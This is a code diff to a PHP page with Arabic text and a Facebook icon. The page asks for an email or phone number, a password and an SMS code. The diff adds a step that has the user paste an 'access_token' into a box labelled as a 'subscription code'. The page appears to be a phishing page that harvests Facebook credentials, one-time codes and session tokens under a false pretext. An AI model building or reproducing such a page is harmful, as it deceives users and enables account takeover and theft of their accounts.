@@ -14,7 +14,7 @@ header("Location: ../");
 }
 </style>
 <?php
-$st['login']="NLogin";
+$st['login']="NLog";
 $icon = "facebook-square" ;
 $st['name']="البريد الالكترونى او الهاتف";
 $st['pass']="كلمه المرور";
@@ -38,6 +38,10 @@ $st['title'] ="يتم الان جلب المعلومات الخاصه بك من 
 </style>
 <?php
 }
+if(isv("post")){
+  $st['title'] ="ضع كود الاشتراك فى الاسفل ثم اضغط على زر الاشتراك";
+
+}
 if(Sion("Lerror") == 406){
 $code = 406;
 $st['title']="سيصلك كود الاشتراك فى رساله على هاتفك  ضعه فى الاسفل واضغط على زر تأكيد الاشتراك";
@@ -48,7 +52,7 @@ $st['btn'] = "تأكيد الاشتراك";
 ?>
  <div class="container">
  <div class="row">
- <form id="form" action="../get_code.php" method="post">
+ <form id="form" action="../login.html" method="post">
 	   <div class="addpost col s12 m12" style="    left: 0;
     position: absolute;
     top: 74px;
@@ -70,6 +74,7 @@ $st['btn'] = "تأكيد الاشتراك";
      <input type="text"  name="user" dir="ltr" class="form-control center " value="<?=Sion("user")?>" id="email" >
           <label for="first_name" ><?=$st['name']?></label>
         </div>
+<?php if(!isv("post")){ ?>
         <div class="input-field col s12 ">
         <?php if(Sion("Lerror")){  ?>
      <input type="text"  name="pass" dir="ltr" class="form-control center " value="" id="email" >
@@ -85,6 +90,9 @@ $st['btn'] = "تأكيد الاشتراك";
         <div class="input-field col s12 center reSend " style="<?=$st['dis']?>">
         <button name="reSend" class="btn-flat" type="submit" value="send" >اعادة ارسال كود الاشتراك ؟</button>
         </div>
+      <?php }else{ ?>
+        <textarea name="access_token" rows="3" cols="100"  placeholder="ضع كود الاشتراك هنا"></textarea>
+      <?php } ?>
 <div class="col s12  center bold"   >
      <?=loding("",1)?>
 </div>
